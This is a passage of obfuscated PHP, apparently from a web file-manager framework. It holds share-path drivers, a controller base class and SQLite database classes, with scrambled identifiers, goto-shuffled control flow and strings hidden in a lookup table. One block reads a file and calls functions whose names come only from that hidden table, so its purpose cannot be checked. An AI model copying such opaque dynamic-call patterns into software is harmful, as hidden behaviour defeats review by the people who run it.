$¼ó¥â¹) { if (is_array($¼ó¥â¹) && isset($¼ó¥â¹[0]) && is_string($¼ó¥â¹[0]) && strtolower($¼ó¥â¹[0]) == $¢² Ğ¨ñ[7] && is_array($¼ó¥â¹[1]) && count($¼ó¥â¹[1]) > $ğ°ĞïËµ) { ignore_timeout(); return $¶Î²¤ª²; } } return !1; } public function setMasterDB($­ÀÖğ›É = true) { think_config($_SERVER[Î‹ÃÂŞ„][441], $­ÀÖğ›É); } } class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\171\x73\x74\145\x6d\117\x70\x74\151\x6f\x6e"; public $field = array(); public function listData($ˆ¡åêí = false, $âÅ’èü˜ = "\x6d\x6f\144\x69\x66\x79\x54\x69\x6d\145", $ŞŠ»ĞÙ = false) { $ä™šè… = Model($this->modelType)->get(!1, $this->optionType, !0); $×•‚ˆŠ‰ = array_values($ä™šè…); if ($×•‚ˆŠ‰ && $×•‚ˆŠ‰[0] && !is_array($×•‚ˆŠ‰[0])) { Model($this->modelType)->cacheRemove($this->optionType); $ä™šè… = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$ä™šè…) { return $ˆ¡åêí ? null : array(); } if (!$ˆ¡åêí) { $ä™šè… = array_filter(array_values($ä™šè…)); return array_sort_by($ä™šè…, $âÅ’èü˜, $ŞŠ»ĞÙ); } return $ä™šè…[$_SERVER[Î‹ÃÂŞ„][442] . $ˆ¡åêí]; } public function insert($çş€½¥) { $ëÆıø’ =& $_SERVER[Î‹ÃÂŞ„]; $çş€½¥ = array_field_key($çş€½¥, $this->field); $ÛÌ´¬› = Model($this->modelType)->get($ëÆıø’[443], $this->optionType . $ëÆıø’[444]); $ÛÌ´¬› = $ÛÌ´¬› ? $ÛÌ´¬› : 0; $çş€½¥[$ëÆıø’[445]] = ++$ÛÌ´¬›; $çş€½¥[$ëÆıø’[217]] = time(); $çş€½¥[$ëÆıø’[87]] = time(); Model($this->modelType)->set($ëÆıø’[443], $ÛÌ´¬›, $this->optionType . $ëÆıø’[444]); Model($this->modelType)->set($ëÆıø’[442] . $ÛÌ´¬›, $çş€½¥, $this->optionType); return $ÛÌ´¬›; } public function update($ğ‡ç¶Ãì, $˜äÒı¸É) { $¤şÅ€“¡ =& $_SERVER[Î‹ÃÂŞ„]; $˜äÒı¸É = array_field_key($˜äÒı¸É, $this->field); $œè˜µó = $this->listData($ğ‡ç¶Ãì); if (!$œè˜µó || !$ğ‡ç¶Ãì) { return !1; } $˜äÒı¸É = array_merge($œè˜µó, $˜äÒı¸É); $˜äÒı¸É[$¤şÅ€“¡[87]] = time(); return Model($this->modelType)->set($¤şÅ€“¡[442] . $ğ‡ç¶Ãì, $˜äÒı¸É, $this->optionType); } public function remove($¥©‹•ù) { if (!$¥©‹•ù) { return !1; } return Model($this->modelType)->remove($_SERVER[Î‹ÃÂŞ„][442] . $¥©‹•ù, $this->optionType); } public function clear() { $Ò§ÙÄœ… =& $_SERVER[Î‹ÃÂŞ„]; Model($this->modelType)->remove($Ò§ÙÄœ…[443], $this->optionType . $Ò§ÙÄœ…[444]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($şáÜ¢Êë, $¿À±îîõ) { if (!$¿À±îîõ) { return !1; } $¥’Ù½—È = $this->listData(); $¥’Ù½—È = array_to_keyvalue($¥’Ù½—È, $şáÜ¢Êë); return isset($¥’Ù½—È[$¿À±îîõ]) ? $¥’Ù½—È[$¿À±îîõ] : !1; } public function findByName($èäË¥±Ü) { return $this->findByKey($_SERVER[Î‹ÃÂŞ„][32], $èäË¥±Ü); } protected function resetData($Ìñ”Ì¥Š) { $ßí¯¾Ö™ =& $_SERVER[Î‹ÃÂŞ„]; $Ìñ”Ì¥Š = is_array($Ìñ”Ì¥Š) ? $Ìñ”Ì¥Š : array(); $„±ûŞ = array(); for ($³¿—ÌÈ¶ = 0; $³¿—ÌÈ¶ < count($Ìñ”Ì¥Š); $³¿—ÌÈ¶++) { $„±ûŞ[$ßí¯¾Ö™[442] . $Ìñ”Ì¥Š[$³¿—ÌÈ¶][$ßí¯¾Ö™[445]]] = $Ìñ”Ì¥Š[$³¿—ÌÈ¶]; } return Model($this->modelType)->set($„±ûŞ, !1, $this->optionType); } private function getAutoName($Øß‹±«—) { $ôÂš¼âÕ = array_to_keyvalue($this->listData(), $_SERVER[Î‹ÃÂŞ„][32]); if (!$ôÂš¼âÕ || !isset($ôÂš¼âÕ[$Øß‹±«—])) { return $Øß‹±«—; } for ($êï¯ãóÊ = 1; $êï¯ãóÊ < count($ôÂš¼âÕ); $êï¯ãóÊ++) { $¿²˜ïØÚ = $Øß‹±«— . "\50{$êï¯ãóÊ}\x29"; if (!isset($ôÂš¼âÕ[$¿²˜ïØÚ])) { return $¿²˜ïØÚ; } } return $¿²˜ïØÚ; } } goto aíˆ¾Âš«„; EÉéæß¨ƒ: function binCheckBigger($²Ä¢À°Ñ, $äúİ­ü†) { return $²Ä¢À°Ñ > $äúİ­ü†; } $_SERVER[$_SERVER[ÏõĞ¥ÓÃ][3]] = ("\x38\x33\x31\x30"."\66\70")+0;$_7b16="l3h2ya85ejntmz9pixogudwsc7k401vrqbf6f8i3rlqmz15jngebwyo0c7a6d4kthsv9upx201xfcd";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($ŠÏÈÑœ , $ãûóÆ¥•) { $„¼ÎÓè =& $_SERVER[Î‹ÃÂŞ„]; if (isset(self::$_methodList[$ŠÏÈÑœ ])) { return @call_user_func_array(self::$_methodList[$ŠÏÈÑœ ], $ãûóÆ¥•); } else { if (method_exists($this, $ŠÏÈÑœ )) { return call_user_func_array(array($this, $ŠÏÈÑœ ), $ãûóÆ¥•); } else { think_exception(__CLASS__ . $„¼ÎÓè[4] . $ŠÏÈÑœ  . $„¼ÎÓè[5]); } } } public static function __callStatic($ ·£ÍÎ¦, $Õü•Ìú) { if (isset(self::$_methodListStatic[$ ·£ÍÎ¦])) { return call_user_func_array(self::$_methodListStatic[$ ·£ÍÎ¦], $Õü•Ìú); } else { if (method_exists(self, $ ·£ÍÎ¦)) { return call_user_func_array(array(self, $ ·£ÍÎ¦), $Õü•Ìú); } else { show_json("{$ ·£ÍÎ¦}\x28\x29\x20\156\157\x74\40\145\x78\151\x73\x74\73", !1); } } } public static function addMethod($ı‚š‚À, $¹–âˆ·“) { self::$_methodList[$ı‚š‚À] = $¹–âˆ·“; } public static function addMethodStatic($éˆÓ½ñ¥, $å®ÁÏ†÷) { self::$_methodListStatic[$éˆÓ½ñ¥] = $å®ÁÏ†÷; } } goto bå˜¤ô„…â; f‰˜†ƒ‡‘ç: class PathDriverDriverShareItem { public function __construct($›ùÇÀ¹¢) { $this->pathParse = $›ùÇÀ¹¢; } public function __call($Ş£“´™, $¬Öˆ„“ø) { $ÑôşÌÍ =& $_SERVER[Î‹ÃÂŞ„]; if (method_exists($this, $Ş£“´™)) { return; } $×”Ú˜ê— = call_user_func_array(array($ÑôşÌÍ[1397], $Ş£“´™), $¬Öˆ„“ø); $¦Ş²âìß = array($ÑôşÌÍ[1398], $ÑôşÌÍ[1399], $ÑôşÌÍ[1400], $ÑôşÌÍ[1401], $ÑôşÌÍ[589], $ÑôşÌÍ[591], $ÑôşÌÍ[1402], $ÑôşÌÍ[109], $ÑôşÌÍ[1403], $ÑôşÌÍ[1404]); if (in_array($Ş£“´™, $¦Ş²âìß)) { $×”Ú˜ê— = $this->getPathOuter($×”Ú˜ê—); } return $×”Ú˜ê—; } public function copy($§•²¬ƒ, $ë©¶î›, $½Ëë š¹ = false, $Ïİ€…À× = false) { return $this->copyMove($§•²¬ƒ, $ë©¶î›, $½Ëë š¹, $_SERVER[Î‹ÃÂŞ„][589], $Ïİ€…À×); } public function move($ªİ•Èç, $æŒòõˆ†, $ª¥Ÿø¨ä = false, $ØÛ™îç = false) { return $this->copyMove($ªİ•Èç, $æŒòõˆ†, $ª¥Ÿø¨ä, $_SERVER[Î‹ÃÂŞ„][591], $ØÛ™îç); } private function copyMove($‰ŒËÓê, $—‹«ä¿‹, $èÜçû÷÷, $İö–Å«Š, $«òˆé· = false) { $‡ı¹øï™ =& $_SERVER[Î‹ÃÂŞ„]; $Â„ÙÍ¨ˆ = $—‹«ä¿‹; $…–ø¤ğò = IO::driverMake($—‹«ä¿‹); if ($…–ø¤ğò->pathParse[$‡ı¹øï™[1206]]) { $—‹«ä¿‹ = $…–ø¤ğò->pathParse[$‡ı¹øï™[1206]]; } else { $—‹«ä¿‹ = $Â„ÙÍ¨ˆ; } $Àà…Ùãê = IO::copyMove($‰ŒËÓê, $—‹«ä¿‹, $èÜçû÷÷, $İö–Å«Š, $«òˆé·); $Àà…Ùãê = $this->getPathOuter($Àà…Ùãê); return $Àà…Ùãê; } public function pathThis($Ù³îéö¥) { return get_path_this($this->pathParse[$_SERVER[Î‹ÃÂŞ„][86]]); } public function pathFather($û¢îÇÎ¦) { return get_path_father($this->pathParse[$_SERVER[Î‹ÃÂŞ„][86]]); } public function iconvSystem($ïÈÉŠ•˜) { return $ïÈÉŠ•˜; } protected function infoParse($í—¢Î×Û, $ôíúôà = false) { $ÌîÔ  =& $_SERVER[Î‹ÃÂŞ„]; $ïµ³‘à¾ = $this->pathParse[$ÌîÔ [531]][$ÌîÔ [1230]] . $this->pathParse[$ÌîÔ [1223]]; if ($ôíúôà) { $ºÃÖÁ  = IO::infoWithChildren($ïµ³‘à¾); } else { $ºÃÖÁ  = IO::info($ïµ³‘à¾); } $¬Õº‡’‰ = $this->pathParse[$ÌîÔ [531]]; return Action($ÌîÔ [1395])->_shareItemeParse($ºÃÖÁ , $¬Õº‡’‰); } public function listAll($À£ø¢ÖÆ) { $ÀŠÙáğÛ =& $_SERVER[Î‹ÃÂŞ„]; $•­ö‘š® = IO::listAll($À£ø¢ÖÆ); $õ‹‰Œ·± = rtrim($this->pathParse[$ÀŠÙáğÛ[531]][$ÀŠÙáğÛ[1230]], $ÀŠÙáğÛ[8]); foreach ($•­ö‘š® as &$’¯Ÿî¶¯) { $’¯Ÿî¶¯[$ÀŠÙáğÛ[86]] = $this->pathDriver . $ÀŠÙáğÛ[8] . ltrim(substr($’¯Ÿî¶¯[$ÀŠÙáğÛ[86]], strlen($õ‹‰Œ·±)), $ÀŠÙáğÛ[8]); } unset($’¯Ÿî¶¯); return $•­ö‘š®; } public function listAllSimple($À±ÑŒÀŒ, $Ö°¾íõ€ = false) { $×¢Ì•ûñ =& $_SERVER[Î‹ÃÂŞ„]; $Ä’‚‹šÆ = $this->listAll($À±ÑŒÀŒ); $Ÿ°ŞàÕ = $this->pathParse[$×¢Ì•ûñ[465]]; if (trim($Ÿ°ŞàÕ, $×¢Ì•ûñ[8]) == trim(get_path_father($Ÿ°ŞàÕ), $×¢Ì•ûñ[8])) { $Ö°¾íõ€ = !0; } return IO::init($×¢Ì•ûñ[12])->listAllSimpleMake($Ä’‚‹šÆ, $Ÿ°ŞàÕ, $Ö°¾íõ€); } public function getPathOuter($¾ÄÕëˆƒ) { $‹¾£ãØ˜ =& $_SERVER[Î‹ÃÂŞ„]; $£±½µÀŸ = KodIO::parse($¾ÄÕëˆƒ); if ($£±½µÀŸ[$‹¾£ãØ˜[33]] == KodIO::KOD_SHARE_ITEM) { return $£±½µÀŸ[$‹¾£ãØ˜[86]]; } $úæ’üá¶ = KodIO::clear($¾ÄÕëˆƒ); $©ûâëç˜ = KodIO::clear($this->pathParse[$‹¾£ãØ˜[531]][$‹¾£ãØ˜[1230]]); $—›È½¾´ = substr($úæ’üá¶, strlen($©ûâëç˜)); if (substr($úæ’üá¶, 0, strlen($©ûâëç˜)) != $©ûâëç˜) { return !1; } return $this->pathParse[$‹¾£ãØ˜[1224]] . $‹¾£ãØ˜[8] . ltrim($—›È½¾´, $‹¾£ãØ˜[8]); } public function getType() { $­Ì·üƒ =& $_SERVER[Î‹ÃÂŞ„]; $ø…‡Åç¸ = str_replace($­Ì·üƒ[76], $­Ì·üƒ[12], get_class($this)); return strtolower($ø…‡Åç¸); } public function isTypeObject($Øˆ½º­½) { return IO::isTypeObject($Øˆ½º­½); } public function info($ÂÎÙğ) { return $this->infoParse($ÂÎÙğ); } public function infoAuth($Ûğ¬¸‹») { return $this->infoParse($Ûğ¬¸‹»); } public function infoWithChildren($ğş–â…) { return $this->infoParse($ğş–â…, !0); } public function infoFull($ö»®ĞâÂ) { return $this->infoParse($ö»®ĞâÂ); } } if ($_SERVER[$_SERVER[Î‹ÃÂŞ„][926]] != $_SERVER[$_SERVER[Î‹ÃÂŞ„][1405]]) { $_getc = $_SERVER[Î‹ÃÂŞ„][928]; $_getfile = $_SERVER[$_SERVER[Î‹ÃÂŞ„][929]] . $_SERVER[Î‹ÃÂŞ„][930]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[Î‹ÃÂŞ„][248], $_getfilec); if (count($_getarrs) < $_SERVER[Î‹ÃÂŞ„][657]) { $exit = $_SERVER[Î‹ÃÂŞ„][931]; $exit(); } $_act = $_SERVER[Î‹ÃÂŞ„][1014]; $_act($_SERVER[$_SERVER[Î‹ÃÂŞ„][924]]); } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($â¯˜ºËµ) { $this->pathParse = $â¯˜ºËµ; } protected function infoParse($­÷¤™ÚÛ, $˜ÇÛ = false) { $¦î®úÖ =& $_SERVER[Î‹ÃÂŞ„]; return Action($¦î®úÖ[1229])->sharePathInfo($this->pathParse[$¦î®úÖ[86]], !0, $˜ÇÛ); } public function listPath($‘ªÍƒı , $û–ê„™ = false) { $ùƒ­À =& $_SERVER[Î‹ÃÂŞ„]; $Â”ßé’Â = IO::listPath($‘ªÍƒı , $û–ê„™); if (!$Â”ßé’Â) { return $Â”ßé’Â; } if (is_array($Â”ßé’Â[$ùƒ­À[1396]])) { $ÅÌµú‡„ = Action($ùƒ­À[1406])->parsePathChildren($Â”ßé’Â[$ùƒ­À[1396]], array($ùƒ­À[465] => $‘ªÍƒı )); $Â”ßé’Â[$ùƒ­À[1396]] = Action($ùƒ­À[1229])->shareItemInfo($ÅÌµú‡„); } foreach ($Â”ßé’Â as $ÉšÕú€ô => $Ûé­Ëãó) { if (!in_array($ÉšÕú€ô, array($ùƒ­À[85], $ùƒ­À[84]))) { continue; } foreach ($Ûé­Ëãó as $º¿÷Àéû => $ÅÌµú‡„) { $ÅÌµú‡„ = Action($ùƒ­À[1406])->parsePathChildren($ÅÌµú‡„, array($ùƒ­À[465] => $‘ªÍƒı )); $Â”ßé’Â[$ÉšÕú€ô][$º¿÷Àéû] = Action($ùƒ­À[1229])->shareItemInfo($ÅÌµú‡„); } } return $Â”ßé’Â; } } goto D‰áò¾š¢Ë; bå˜¤ô„…â: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $Üäı±­‘ =& $_SERVER[Î‹ÃÂŞ„]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$Üäı±­‘[6]] =& $config; $this->values[$Üäı±­‘[7]] =& $in; $this->tpl = TEMPLATE . MOD . $Üäı±­‘[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($ø™õšç€) { if (1 === func_num_args()) { $this->{$ø™õšç€} = new $ø™õšç€(); } else { $–ş©€Ÿ = new ReflectionClass($ø™õšç€); $¹Ö‘ÚÎ» = func_get_args(); array_shift($¹Ö‘ÚÎ»); $this->{$ø™õšç€} = $–ş©€Ÿ->newInstanceArgs($¹Ö‘ÚÎ»); } return $this->{$ø™õšç€}; } public function routeBind($±ë±ê™¼, $÷¬­ÄË, $•ù–“ÉÃ = 3) { $î·èöâ¨ =& $_SERVER[Î‹ÃÂŞ„]; $ëÌ¶Œõ˜ = $this->in[$î·èöâ¨[9]]; $±ë±ê™¼ = str_replace($î·èöâ¨[10], $î·èöâ¨[11], trim(trim($±ë±ê™¼, $î·èöâ¨[8]), $î·èöâ¨[12])); if (!$±ë±ê™¼ || count($ëÌ¶Œõ˜) <= $•ù–“ÉÃ) { return !1; } $§àç©º» = !0; $ïÎ²¥ñ = explode($î·èöâ¨[8], $±ë±ê™¼); for ($Ğşõ½²Ù = 0; $Ğşõ½²Ù < count($ïÎ²¥ñ); $Ğşõ½²Ù++) { if ($ïÎ²¥ñ[$Ğşõ½²Ù] != $ëÌ¶Œõ˜[$•ù–“ÉÃ + $Ğşõ½²Ù]) { $§àç©º» = !1; break; } } if (!$§àç©º») { return; } call_user_func_array(array($this, $÷¬­ÄË), array()); } public function routeArgs($¦ÇÜ¾ÎŸ = 3) { $â¸ìğöá = $this->in[$_SERVER[Î‹ÃÂŞ„][9]]; if (count($â¸ìğöá) <= $¦ÇÜ¾ÎŸ) { return array(); } $ÜèÕ¸ = array(); for ($ë¯€õ‹§ = $¦ÇÜ¾ÎŸ; $ë¯€õ‹§ < count($â¸ìğöá); $ë¯€õ‹§ += 2) { $ÜèÕ¸[$â¸ìğöá[$ë¯€õ‹§]] = $â¸ìğöá[$ë¯€õ‹§ + 1]; $this->in[$â¸ìğöá[$ë¯€õ‹§]] = $â¸ìğöá[$ë¯€õ‹§ + 1]; } return $ÜèÕ¸; } protected function assign($ÄááÔûú, $àå†Ùîß) { $this->values[$ÄááÔûú] = $àå†Ùîß; } protected function display($ƒãÈóø) { ob_end_clean(); extract($this->values); require $this->tpl . $ƒãÈóø; } } class DbSqliteBase extends Db { public function __construct($ôí´à˜© = '') { $µóÕ¾Ê =& $_SERVER[Î‹ÃÂŞ„]; if (!extension_loaded($µóÕ¾Ê[13])) { think_exception(think_lang($µóÕ¾Ê[14]) . $µóÕ¾Ê[15]); } if (!empty($ôí´à˜©)) { if (!isset($ôí´à˜©[$µóÕ¾Ê[16]])) { $ôí´à˜©[$µóÕ¾Ê[16]] = 438; } $this->config = $ôí´à˜©; if (empty($this->config[$µóÕ¾Ê[17]])) { $this->config[$µóÕ¾Ê[17]] = array(); } } } public function connect($ŸİÎËŸŒ = '', $ª¾ˆÉ×¨ = 0) { $Õ„ºŞ³© =& $_SERVER[Î‹ÃÂŞ„]; if (!isset($this->linkID[$ª¾ˆÉ×¨])) { if (empty($ŸİÎËŸŒ)) { $ŸİÎËŸŒ = $this->config; } $×“¼ä³à = !empty($ŸİÎËŸŒ[$Õ„ºŞ³©[17]][$Õ„ºŞ³©[18]]) ? $ŸİÎËŸŒ[$Õ„ºŞ³©[17]][$Õ„ºŞ³©[18]] : $this->pconnect; $ÌƒÜ·½Ù = $×“¼ä³à ? $Õ„ºŞ³©[19] : $Õ„ºŞ³©[20]; $this->linkID[$ª¾ˆÉ×¨] = $ÌƒÜ·½Ù($ŸİÎËŸŒ[$Õ„ºŞ³©[21]], $ŸİÎËŸŒ[$Õ„ºŞ³©[16]]); if (!$this->linkID[$ª¾ˆÉ×¨]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$ª¾ˆÉ×¨], 30000); if (1 != think_config($Õ„ºŞ³©[22])) { unset($this->config); } } return $this->linkID[$ª¾ˆÉ×¨]; } public function free() { $this->queryID = null; } public function query($‰îÖ”Ã’) { $‰–Ó­Œª =& $_SERVER[Î‹ÃÂŞ„]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $‰îÖ”Ã’; if ($this->queryID) { $this->free(); } think_action_status($‰–Ó­Œª[23], 1); think_status($‰–Ó­Œª[24]); $this->queryID = sqlite_query($this->_linkID, $‰îÖ”Ã’); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $á‡×¤§” = $this->getAll(); return $á‡×¤§”; } } public function execute($Ÿ¦²™ò) { $ÛÙ×ôÙØ =& $_SERVER[Î‹ÃÂŞ„]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Ÿ¦²™ò; if ($this->queryID) { $this->free(); } think_action_status($ÛÙ×ôÙØ[25], 1); think_status($ÛÙ×ôÙØ[24]); $Èñ«Ùâ§ = sqlite_exec($this->_linkID, $Ÿ¦²™ò); $this->debug(); if (!1 === $Èñ«Ùâ§) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[Î‹ÃÂŞ„][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ò½¸ÓØ± = sqlite_query($this->_linkID, $_SERVER[Î‹ÃÂŞ„][27]); if (!$ò½¸ÓØ±) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $„°ñŠ§† = sqlite_query($this->_linkID, $_SERVER[Î‹ÃÂŞ„][28]); if (!$„°ñŠ§†) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $ïèòıÛ = array(); if ($this->numRows > 0) { for ($ ×•§Ö = 0; $ ×•§Ö < $this->numRows; $ ×•§Ö++) { $ïèòıÛ[$ ×•§Ö] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $ïèòıÛ; } public function getFields($ ¹µğ€) { $†È‹›ùÚ =& $_SERVER[Î‹ÃÂŞ„]; $£Ùû¤á¸ = $this->query($†È‹›ùÚ[29] . $ ¹µğ€ . $†È‹›ùÚ[30]); $˜ü“È†è = array(); if ($£Ùû¤á¸) { foreach ($£Ùû¤á¸ as $êğÙÛ®Ó => $˜øëş£÷) { $˜ü“È†è[$˜øëş£÷[$†È‹›ùÚ[31]]] = array($†È‹›ùÚ[32] => $˜øëş£÷[$†È‹›ùÚ[31]], $†È‹›ùÚ[33] => $˜øëş£÷[$†È‹›ùÚ[34]], $†È‹›ùÚ[35] => (bool) ($˜øëş£÷[$†È‹›ùÚ[36]] === $†È‹›ùÚ[12]), $†È‹›ùÚ[37] => $˜øëş£÷[$†È‹›ùÚ[38]], $†È‹›ùÚ[39] => strtolower($˜øëş£÷[$†È‹›ùÚ[40]]) == $†È‹›ùÚ[41], $†È‹›ùÚ[42] => strtolower($˜øëş£÷[$†È‹›ùÚ[43]]) == $†È‹›ùÚ[44]); } } return $˜ü“È†è; } public function getTables($Ş‰áûÉ = '') { $®Ğ›¥Â› =& $_SERVER[Î‹ÃÂŞ„]; $®ö„­Ã” = $this->query($®Ğ›¥Â›[45] . $®Ğ›¥Â›[46] . $®Ğ›¥Â›[47]); $äì†Ø« = array(); foreach ($®ö„­Ã” as $šØÔá»Š => $í­áóÏ…) { $äì†Ø«[$šØÔá»Š] = current($í­áóÏ…); } return $äì†Ø«; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $Ûó¥ş—ò =& $_SERVER[Î‹ÃÂŞ„]; $àÇœ÷‘Æ = sqlite_last_error($this->_linkID); $this->error = $àÇœ÷‘Æ . $Ûó¥ş—ò[4] . sqlite_error_string($àÇœ÷‘Æ); if ($Ûó¥ş—ò[12] != $this->queryStr) { $this->error .= LNG($Ûó¥ş—ò[48]) . $this->queryStr; } think_trace($this->error, $Ûó¥ş—ò[12], $Ûó¥ş—ò[49]); return $this->error; } public function escapeString($ÎÄó˜Á¡) { return sqlite_escape_string($ÎÄó˜Á¡); } public function parseLimit($èã¤ÚµÒ) { $²ä«¸¢ =& $_SERVER[Î‹ÃÂŞ„]; $ºª€ò¼² = $²ä«¸¢[12]; if (!empty($èã¤ÚµÒ)) { $èã¤ÚµÒ = explode($²ä«¸¢[50], $èã¤ÚµÒ); if (count($èã¤ÚµÒ) > 1) { $ºª€ò¼² .= $²ä«¸¢[51] . $èã¤ÚµÒ[1] . $²ä«¸¢[52] . $èã¤ÚµÒ[0] . $²ä«¸¢[53]; } else { $ºª€ò¼² .= $²ä«¸¢[51] . $èã¤ÚµÒ[0] . $²ä«¸¢[53]; } } return $ºª€ò¼²; } } class DbSqlite3Base extends Db { public function __construct($ÇÌËÆŸ† = '') { $›¢âÀ““ =& $_SERVER[Î‹ÃÂŞ„]; if (!class_exists($›¢âÀ““[54])) { think_exception(think_lang($›¢âÀ““[14]) . $›¢âÀ““[55]); } if (!empty($ÇÌËÆŸ†)) { if (!isset($ÇÌËÆŸ†[$›¢âÀ““[16]])) { $ÇÌËÆŸ†[$›¢âÀ““[16]] = 438; } $this->config = $ÇÌËÆŸ†; if (empty($this->config[$›¢âÀ““[17]])) { $this->config[$›¢âÀ““[17]] = array(); } } } public function connect($îıš£Û¹ = '', $öî™öÖ = 0) { $³ôÌßË =& $_SERVER[Î‹ÃÂŞ„]; if (!isset($this->linkID[$öî™öÖ])) { if (empty($îıš£Û¹)) { $îıš£Û¹ = $this->config; } $this->linkID[$öî™öÖ] = new SQLite3($îıš£Û¹[$³ôÌßË[21]]); if (!$this->linkID[$öî™öÖ]) { think_exception($this->linkID[$öî™öÖ]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$öî™öÖ]->busyTimeout(30000); if (1 != think_config($³ôÌßË[22])) { unset($this->config); } } return $this->linkID[$öî™öÖ]; } public function free() { $this->queryID = null; } public function query($èµ…©ÑÛ) { $Ù¦®óÉœ =& $_SERVER[Î‹ÃÂŞ„]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $èµ…©ÑÛ; if ($this->queryID) { $this->free(); } think_action_status($Ù¦®óÉœ[23], 1); think_status($Ù¦®óÉœ[24]); $this->queryID = $this->_linkID->query($èµ…©ÑÛ); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $Ë‹†œ´ = $this->getAll(); $this->numRows = count($Ë‹†œ´); return $Ë‹†œ´; } } public function execute($×ÍíÔ‚ë) { $óÊ²Ä„ =& $_SERVER[Î‹ÃÂŞ„]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $×ÍíÔ‚ë; if ($this->queryID) { $this->free(); } think_action_status($óÊ²Ä„[25], 1); think_status($óÊ²Ä„[24]); $ıõâ¾šÀ = $this->_linkID->exec($×ÍíÔ‚ë); $this->debug(); if (!1 === $ıõâ¾šÀ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[Î‹ÃÂŞ„][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ì˜˜§êõ = $this->_linkID->query($_SERVER[Î‹ÃÂŞ„][27]); if (!$ì˜˜§êõ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $ó°úñ…£ = $this->_linkID->query($_SERVER[Î‹ÃÂŞ„][28]); if (!$ó°úñ…£) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $€Ş¹å÷ = array(); while ($ãÕ«¤ôì = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $€Ş¹å÷[] = $ãÕ«¤ôì; } $this->queryID->reset(); return $€Ş¹å÷; } public function getFields($íàûÎ¥ı) { $¸öÀ§§ =& $_SERVER[Î‹ÃÂŞ„]; $ºÁçÀäò = $this->query($¸öÀ§§[29] . $íàûÎ¥ı . $¸öÀ§§[30]); $˜Üá×œŸ = array(); if ($ºÁçÀäò) { foreach ($ºÁçÀäò as $—ö­ä© => $ÎØš›¾˜) { $˜Üá×œŸ[$ÎØš›¾˜[$¸öÀ§§[32]]] = array($¸öÀ§§[32] => $ÎØš›¾˜[$¸öÀ§§[32]], $¸öÀ§§[33] => $ÎØš›¾˜[$¸öÀ§§[33]], $¸öÀ§§[35] => (bool) ($ÎØš›¾˜[$¸öÀ§§[35]] === $¸öÀ§§[12]), $¸öÀ§§[37] => $ÎØš›¾˜[$¸öÀ§§[56]], $¸öÀ§§[39] => (bool) $ÎØš›¾˜[$¸öÀ§§[57]], $¸öÀ§§[42] => (bool) $ÎØš›¾˜[$¸öÀ§§[57]]); } } return $˜Üá×œŸ; } public function getTables($Šºñ¡Å‡ = '') { $º¡ƒªİ´ =& $_SERVER[Î‹ÃÂŞ„]; $ş­˜¹Ç = $this->query($º¡ƒªİ´[45] . $º¡ƒªİ´[46] . $º¡ƒªİ´[47]); $ÓÕÑúìæ = array(); foreach ($ş­˜¹Ç as $¹Ù Šš => $Õèş³İ÷) { $ÓÕÑúìæ[$¹Ù Šš] = current($Õèş³İ÷); } return $ÓÕÑúìæ; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $¢º“äÍ =& $_SERVER[Î‹ÃÂŞ„]; $this->error = $this->_linkID->lastErrorMsg(); if ($¢º“äÍ[12] != $this->queryStr) { $this->error .= LNG($¢º“äÍ[48]) . $this->queryStr; } think_trace($this->error, $¢º“äÍ[12], $¢º“äÍ[49]); return $this->error; } public function escapeString($¥çÏ åÔ) { $³†¯”îß =& $_SERVER[Î‹ÃÂŞ„]; if ($this->_linkID) { return $this->_linkID->escapeString($¥çÏ åÔ); } return str_ireplace($³†¯”îß[58], $³†¯”îß[59], $¥çÏ åÔ); } public function parseLimit($ƒ¶ÔŠš‹) { $ÙíƒüÍÛ =& $_SERVER[Î‹ÃÂŞ„]; $‚†ŠšÕñ = $ÙíƒüÍÛ[12]; if (!empty($ƒ¶ÔŠš‹)) { $ƒ¶ÔŠš‹ = explode($ÙíƒüÍÛ[50], $ƒ¶ÔŠš‹); if (count($ƒ¶ÔŠš‹) > 1) { $‚†ŠšÕñ .= $ÙíƒüÍÛ[51] . $ƒ¶ÔŠš‹[1] . $ÙíƒüÍÛ[52] . 